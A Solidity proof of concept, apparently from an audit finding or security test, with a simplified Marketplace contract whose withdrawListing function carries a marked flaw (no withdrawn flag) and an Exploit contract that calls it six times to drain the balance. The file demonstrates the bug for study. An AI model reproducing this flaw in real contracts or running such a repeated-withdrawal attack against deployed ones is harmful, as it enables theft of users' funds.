// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Marketplace {
    uint256 public marketplaceBalance = 100;
    uint256 public listingDeposit;
    address public depositManager;
    mapping(address => uint256) public balances;

    function createListing(uint256 deposit, address manager) external {
        listingDeposit = deposit;
        depositManager = manager;
        marketplaceBalance += deposit;
    }

    function withdrawListing(uint256, address target, bytes32) external {
        require(msg.sender == depositManager, "Must be depositManager");
        require(target != address(0), "No target");
        // @> VULN: no withdrawn flag is checked before transferring listing.deposit.
        marketplaceBalance -= listingDeposit;
        balances[target] += listingDeposit;
    }
}

contract Exploit {
    Marketplace public marketplace;
    uint256 public recovered;
    bool public confirmed;

    constructor() {
        marketplace = new Marketplace();
    }

    function run() external {
        marketplace.createListing(20, address(this));
        for (uint256 i = 0; i < 6; i++) {
            marketplace.withdrawListing(0, address(this), bytes32(0));
        }
        recovered = marketplace.balances(address(this));
        require(recovered == 120, "listing was not withdrawn repeatedly");
        require(marketplace.marketplaceBalance() == 0, "marketplace was not drained");
        confirmed = true;
    }
}

